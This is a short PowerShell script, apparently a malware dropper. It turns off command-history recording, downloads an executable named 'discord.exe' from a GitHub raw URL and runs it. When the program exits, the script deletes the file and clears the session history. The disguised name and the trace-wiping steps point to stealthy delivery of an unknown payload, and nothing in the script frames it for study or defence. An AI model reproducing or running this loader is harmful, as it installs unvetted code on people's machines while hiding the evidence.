```powershell
# ===== CONFIG =====
$exeUrl = "https://raw.githubusercontent.com/lubyralph6-maker/godpum.ps1/main/discord.exe"

# ===== DISABLE SESSION HISTORY =====
try {
    Remove-Module PSReadLine -ErrorAction SilentlyContinue
} catch {}

# ===== TEMP FILE =====
$tempExe = Join-Path $env:TEMP "discord.exe"

# ===== DOWNLOAD =====
Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe

# ===== RUN =====
$proc = Start-Process $tempExe -PassThru

# ===== WAIT UNTIL CLOSE =====
$proc.WaitForExit()

# ===== DELETE TEMP FILE =====
if (Test-Path $tempExe) {
    Remove-Item $tempExe -Force -ErrorAction SilentlyContinue
}

# ===== CLEAR CURRENT SESSION HISTORY =====
Clear-History

Write-Host "Finished"
```
